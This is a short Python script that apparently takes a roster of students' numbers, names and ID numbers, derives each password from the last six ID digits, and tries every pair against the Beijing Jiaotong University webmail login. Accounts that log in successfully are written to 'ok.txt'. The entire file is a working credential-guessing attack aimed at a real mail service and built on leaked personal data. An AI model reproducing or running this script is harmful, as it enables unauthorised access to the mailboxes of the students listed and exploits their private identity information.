import requests
from common.Io import read_lines, write
import re

API = "https://mail.bjtu.edu.cn/coremail/xphone/index.jsp"
head = {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"}
reobj = re.compile(r"^(?P<no>\d+)\s+(?P<name>.+?)\s+.*\d{12}(?P<pwd>\d{5}[0-9X])")
isResume = True
if __name__ == "__main__":

    for i, l in enumerate(read_lines("mails.txt")):
        match = reobj.match(l)
        if not match:
            continue
        no = match.groupdict()["no"]
        name = match.groupdict()["name"]
        pwd = match.groupdict()["pwd"]


        if no == "16120300":
            isResume = True

        if not isResume:
            continue
        print("第%s个:  %s %s %s" % (i, no, name, pwd))
        r = requests.post(API, data={"uid": no, "password": pwd, "action:login": ""}, headers=head)
        # print(r.text)
        if "每次都要更新token 的有效时长" in r.text:

            print("可用")
            write("ok.txt", l)
        else:
            print("不可用")
